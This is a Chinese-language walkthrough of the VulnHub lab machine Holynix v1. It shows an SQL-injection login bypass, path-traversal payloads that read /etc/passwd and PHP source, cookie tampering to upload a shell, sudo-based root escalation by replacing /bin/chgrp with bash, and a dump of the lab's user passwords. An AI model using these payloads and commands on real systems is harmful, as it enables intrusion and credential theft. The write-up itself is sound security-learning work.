# Holynix：v1

2024-6-5 https://www.vulnhub.com/entry/holynix-v1,20/

difficulty: easy

## IP

192.168.10.193

## Scan

Open Port -> 80

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
```

只开放了 80 web 端口，需要通过 web shell 进入到目标系统。

http://192.168.10.193/index.php?page=login.php 注意到登陆页面的链接这里，可能存在 LFI 漏洞。访问 http://192.168.10.193/index.php?page=../../../../../../etc/passwd 这里提示找不到 404.html ，应该是 index.php 中做了 page 参数判断，限制了白名单文件。

http://192.168.10.193/index.php 点击左侧 login 链接，出现登陆窗口，测试是否存在 sql 注入，用户名和密码都输入 `' or 1=1 -- -` , 可以登陆进入，证明存在 sql 注入。

http://192.168.10.193/index.php?page=upload.php 有一个上传文件的功能，但是当前用户测试上传提示有限制。

http://192.168.10.193/index?page=employeedir.php 列出的员工信息。

http://192.168.10.193/index.php?page=ssp.php 这里可以进行选择查看相应内容，抓包发现其 post 发送内容为 `text_file_name=ssp/software_installation.txt&B=Display File`， text_file_name 这里体现出了路径，可能存在 LFI 漏洞，进行修改: text_file_name=ssp/../../../../../../../etc/passwd&B=Display+File ，结果看到了我们想要的内容：

```
<pre>
root:x:0:0:root:/root:/bin/bash
...
alamo:x:1000:115::/home/alamo:/bin/bash
etenenbaum:x:1001:100::/home/etenenbaum:/bin/bash
gmckinnon:x:1002:100::/home/gmckinnon:/bin/bash
hreiser:x:1003:50::/home/hreiser:/bin/bash
jdraper:x:1004:100::/home/jdraper:/bin/bash
jjames:x:1005:50::/home/jjames:/bin/bash
jljohansen:x:1006:115::/home/jljohansen:/bin/bash
ltorvalds:x:1007:113::/home/ltorvalds:/bin/bash
kpoulsen:x:1008:100::/home/kpoulsen:/bin/bash
mrbutler:x:1009:50::/home/mrbutler:/bin/bash
rtmorris:x:1010:100::/home/rtmorris:/bin/bash
</pre>
```

先看看上传文件那里的源码是否能去读：

```php
text_file_name=ssp/../upload.php&B=Display+File

text_file_name=ssp/../transfer.php&B=Display+File

<?php
if ( $auth == 0 ) {
        echo "<center><h2>Content Restricted</h2></center>";
} else {
	if ( $upload == 1 )
	{
		$homedir = "/home/".$logged_in_user. "/";
		$uploaddir = "upload/";
		$target = $uploaddir . basename( $_FILES['uploaded']['name']) ;
		$uploaded_type = $_FILES['uploaded']['type'];
		$command=0;
		$ok=1;

		if ( $uploaded_type =="application/gzip" && $_POST['autoextract'] == 'true' ) {	$command = 1; }

		if ($ok==0)
		{
			echo "Sorry your file was not uploaded";
			echo "<a href='?index.php?page=upload.php' >Back to upload page</a>";
		} else {
        		if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $target))
			{
				echo "<h3>The file '" .$_FILES['uploaded']['name']. "' has been uploaded.</h3><br />";
				echo "The ownership of the uploaded file(s) have been changed accordingly.";
				echo "<br /><a href='?page=upload.php' >Back to upload page</a>";
				if ( $command == 1 )
				{
					exec("sudo tar xzf " .$target. " -C " .$homedir);
					exec("rm " .$target);
				} else {
					exec("sudo mv " .$target. " " .$homedir . $_FILES['uploaded']['name']);
				}
				exec("/var/apache2/htdocs/update_own");
        		} else {
				echo "Sorry, there was a problem uploading your file.<br />";
				echo "<br /><a href='?page=upload.php' >Back to upload page</a>";
			}
		}
	} else { echo "<br /><br /><h3>Home directory uploading disabled for user " .$logged_in_user. "</h3>"; }
}
?>
```

经过查看源码，发现上传的文件被存储在 `/home/$logged_in_user/$_FILES['uploaded']['name']` 中，但是在 upload 上传时，发现有一些用户不能上传，查看请求，其中有一个 Cookie: uid=0 ，从 0-20 进行遍历，发现有一些 uid 可以上传文件，如 uid=4 对应的用户名为 hreiser，去它的家目录中查找看是否能得到 8888.php 文件，同时在 kali 上监听 8888 端口，看是否能触发反弹：

```
text_file_name=ssp/../../../../../home/hreiser/8888.php&B=Display+File
```

发现可以读取，证明文件上传成功。但是反弹 shell 没有执行，应该是程序中执行了文件读取 stream_get_contents($handle); ，而没有文件包含，导致代码没有执行。

下面需要找到上传的 php 文件所在的 url 链接。

经过 FUZZ 找到了 apache2 的相关配置文件，查看 /etc/apache2/apache2.conf, /etc/apache2/mods-available/userdir.conf 中的内容:

```
<IfModule mod_userdir.c>
        UserDir ./
        UserDir disabled root

        <Directory /home/*/>
                AllowOverride FileInfo AuthConfig Limit
                Options MultiViews Indexes SymLinksIfOwnerMatch IncludesNoExec
        </Directory>
</IfModule>
```

这里启用了 UserDir ，所以就需要通过 http://example.com/~user/ 这样才能访问用户家目录中的文件。

发现了上面 hreiser 用户上传文件的目录：

```
http://192.168.10.193/~hreiser/

8888.php	18-Nov-2011 16:01	0
```

```
www-data@holynix:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

sudo 发现命令：

```
www-data@holynix:/$ sudo -l
User www-data may run the following commands on this host:
(root) NOPASSWD: /bin/chown
(root) NOPASSWD: /bin/chgrp
(root) NOPASSWD: /bin/tar
(root) NOPASSWD: /bin/mv
```

使用 /bin/bash 替换 /bin/chgrp：

```
sudo /bin/mv /bin/chgrp /bin/chgrp.bak
sudo /bin/mv /bin/bash /bin/bash.bak
sudo /bin/mv /bin/bash.bak /bin/chgrp
sudo /bin/chgrp

id
uid=0(root) gid=0(root) groups=0(root)
```

最终得到了 root 权限。

```
select * from accounts;
+-----+------------+--------------------+--------+
| cid | username   | password           | upload |
+-----+------------+--------------------+--------+
|   1 | alamo      | Ih@cK3dM1cR05oF7   | 0      |
|   2 | etenenbaum | P3n7@g0n0wN3d      | 1      |
|   3 | gmckinnon  | d15cL0suR3Pr0J3c7  | 1      |
|   4 | hreiser    | Ik1Ll3dNiN@r315er  | 1      |
|   5 | jdraper    | p1@yIngW17hPh0n35  | 1      |
|   6 | jjames     | @rR35t3D@716       | 1      |
|   7 | jljohansen | m@k1nGb0o7L3g5     | 1      |
|   8 | kpoulsen   | wH@7ar37H3Fed5D01n | 1      |
|   9 | ltorvalds  | f@7H3r0FL1nUX      | 0      |
|  10 | mrbutler   | n@5aHaSw0rM5       | 1      |
|  11 | rtmorris   | Myd@d51N7h3NSA     | 1      |
+-----+------------+--------------------+--------+
11 rows in set (0.00 sec)
```

pis： 这个靶机有问题，重启好几次之后才正常，而且最开始导入虚拟机，一致获取不到 ip，反复修改网卡模式才可以。
